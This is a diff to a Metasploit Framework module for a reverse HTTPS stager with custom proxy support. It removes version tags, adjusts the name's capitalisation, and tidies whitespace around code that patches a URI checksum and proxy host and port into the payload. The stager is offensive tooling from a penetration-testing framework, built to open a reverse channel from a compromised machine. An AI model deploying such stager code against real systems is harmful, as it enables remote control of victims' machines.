@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -21,8 +17,7 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Reverse HTTPS Stager with support for custom proxy',
-			'Version'       => '$Revision$',
+			'Name'          => 'Reverse HTTPS Stager with Support for Custom Proxy',
 			'Description'   => 'Tunnel communication over HTTP using SSL, supports custom proxy',
 			'Author'        => ['hdm','corelanc0d3r <peter.ve@corelan.be>'],
 			'License'       => MSF_LICENSE,
@@ -85,8 +80,8 @@ module Metasploit3
 		i = p.index("/12345\x00")
 		u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttpsProxy::URI_CHECKSUM_INITW) + "\x00"
 		p[i, u.length] = u
-		
-		# patch proxy info	
+
+		# patch proxy info
 		proxyhost = datastore['PROXYHOST'].to_s
 		proxyport = datastore['PROXYPORT'].to_s || "8080"
 		proxyinfo = proxyhost + ":" + proxyport
